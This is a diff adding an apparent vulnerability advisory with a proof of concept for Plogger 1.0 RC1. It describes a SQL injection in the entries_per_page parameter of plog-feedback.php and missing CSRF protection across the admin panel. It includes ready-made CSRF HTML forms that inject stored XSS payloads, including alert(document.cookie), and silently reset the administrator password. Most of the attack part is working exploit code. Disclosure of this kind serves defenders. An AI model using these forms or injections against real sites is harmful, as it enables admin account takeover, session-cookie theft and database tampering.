@@ -1,0 +1,139 @@
+source: http://www.securityfocus.com/bid/58271/info
+
+Plogger is prone to following input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied data:
+
+1. An SQL-injection vulnerability
+2. Multiple cross-site scripting vulnerabilities
+3. A cross-site request forgery vulnerability
+
+An attacker can exploit these issues to execute arbitrary script code in the browser of an unsuspecting user in context of the affected site, steal cookie-based authentication credentials, access or modify data, exploit latent vulnerabilities in the underlying database, and perform certain unauthorized actions; other attacks are also possible.
+
+Plogger 1.0 Rc1 is vulnerable; other versions may also be affected. 
+
++---+[ Feedback.php Sqli ]+---+
+
+Injectable On entries_per_pag Parameter In Feedback.php
+
+http://www.example.com/plogger/plog-admin/plog-feedback.php?entries_per_page=5'
+
+p0c
+
+if (isset($_REQUEST['entries_per_page'])) {
+    $_SESSION['entries_per_page'] = $_REQUEST['entries_per_page'];
+  } else if (!isset($_SESSION['entries_per_page'])) {
+    $_SESSION['entries_per_page'] = 20;
+  }
+.
+.
+.
+$limit = "LIMIT ".$first_item.", ".$_SESSION['entries_per_page'];
+.
+.
+
+// Generate javascript init function for ajax editing
+  $query = "SELECT *, UNIX_TIMESTAMP(`date`) AS `date` from ".PLOGGER_TABLE_PREFIX."comments WHERE `approved` = ".$approved." ORDER BY `id` DESC ".$limit;
+  $result = run_query($query);
+
++---+[ CSRF In Admin Panel ]+---+
+
+Plogger is Not using any parameter or security Token to Protect Against CSRF , So its Vuln To CSRF on ALl Locations Inside Admin Panel..
+
++---+[ XSS ]+---+
+
+Their Are Multiple XSS in Plogger.Like Editing Comment inside Admin Panel.They Are Filtering The Comments For Normal User But Not For Admin.
+And AS it is CSRF All Where SO We Can Edit AN Comment VIA CSRF and Change it With Any XSS Vector..
+
+XSS
+http://www.example.com/plogger/plog-admin/plog-feedback.php
+Edit Comment With ANy XSS Vector OR JUSt do it VIA CSRF.
+
+
+Uploading the File and enter name to any XSS Vector..
+
+http://www.example.com/plogger/plog-admin/plog-upload.php
+
+It Can Me Exploit IN Many Ways LIke
+CSRF + SQLI inside Admin panel..which Is define above.
+
+XSS In Edit Comment.CSRF + XSS
+
+<html>
+<head>
+<form class="edit width-700" action="www.example.com/plogger/plog-admin/plog-feedback.php" method="post">
+    <div style="float: right;"><img src="http://www.example.com/plogger/plog-content/thumbs/plogger-test-collection/plogger-test-album/small/123.png" alt="" /></div>
+    <div>
+      <div class="strong">Edit Comment</div>
+      <p>
+        <label class="strong" accesskey="a" for="author">Author:</label><br />
+        <input size="65" name="author" id="author" value="<script>alert('Hi');</script>" type="hidden"/>
+      </p>
+      <p>
+        <label class="strong" accesskey="e" for="email">Email:</label><br />
+        <input size="65" name="email" id="email" value="asdf@www.example.com.com" type="hidden"/>
+      </p>
+      <p>
+        <label class="strong" accesskey="u" for="url">Website:</label><br />
+        <input size="65" name="url" id="url" value="http://adsf.com" type="hidden"/>
+      </p>
+      <p>
+        <label class="strong" accesskey="c" for="comment">Comment:</label><br />
+        <textarea cols="62" rows="4" name="comment" id="comment"><script>alert('Hi');</script>&lt;/textarea&gt;
+      </p>
+      <input type="hidden" name="pid" value="4" />
+      <input type="hidden" name="action" value="update-comment" />
+      <input class="submit" name="update" value="Update" type="submit" />
+      <input class="submit-cancel" name="cancel" value="Cancel" type="submit" />
+    </div>
+  </form>
+
+
+Another XSS
+http://www.example.com/plogger/plog-admin/plog-manage.php?action=edit-picture&id=1
+Edit Caption To XSS Vector Inside Admin PAnel..
+Again CSRF + XSS
+<form class="edit width-700" action="www.example.com/plogger/plog-admin/plog-manage.php?level=pictures&id=1" method="post">
+      <div style="float: right;"><img src="http://www.example.com/plogger/plog-content/thumbs/plogger-test-collection/plogger-test-album/small/123.png" alt="" /></div>
+      <div>
+        <div class="strong">Edit Image Properties</div>
+        <p>
+          <label class="strong" accesskey="c" for="caption"><em>C</em>aption:</label><br />
+          <input size="62" name="caption" id="caption" value="<script>alert(document.cookie);</script>" type="hidden"/>
+        </p>
+        <p>
+          <label class="strong" for="description">Description:</label><br />
+          <textarea name="description" id="description" cols="60" rows="5"><script>alert(document.cookie);</script>&lt;/textarea&gt;
+        </p>
+        <p><input type="checkbox" id="allow_comments" name="allow_comments" value="1" checked="checked" /><label class="strong" for="allow_comments" accesskey="w">Allo<em>w</em> Comments?</label></p>
+        <input type="hidden" name="pid" value="1" />
+        <input type="hidden" name="action" value="update-picture" />
+        <input class="submit" name="update" value="Update" type="submit" />
+        <input class="submit-cancel" name="cancel" value="Cancel" type="submit" />
+      </div>
+    </form>
+
+
+CSRF Admin Password Reset And XSS
+
+plog-options.php
+
+<form action="http://www.example.com/plogger/plog-admin/plog-options.php" method="post">
+<table class="option-table" cellspacing="0">
+<tbody><tr class="alt">
+<td class="left"><label for="admin_username"></label></td>
+<td class="right"><input size="40" id="admin_username" name="admin_username" value="admin" type="hidden"></td>
+</tr>
+<tr>
+<td class="left"><label for="admin_email"></label></td>
+<td class="right"><input size="40" id="admin_email" name="admin_email" value="www.example.com@hotmail.com" type="hidden"></td>
+</tr>
+<tr class="alt">
+<td class="left"><label for="admin_password"></label></td>
+<td class="right"><input size="40" id="admin_password" name="admin_password" value="123456789" type="hidden"></td>
+<tr>
+<td class="left"><label for="confirm_admin_password"></label></td>
+<td class="right"><input size="40" id="confirm_admin_password" name="confirm_admin_password" value="123456789" type="hidden"></td>
+</tr>
+<td class="left"><label for="gallery_url"></label></td>
+            <td class="right"><input size="40" type="text" id="gallery_url" name="gallery_url" value="<script>alert('hi');</script>" type="hidden"/></td></tr>
+</tbody></table>
+<td class="right"><input class="submit" name="submit" value="DOne" type="submit"></td>
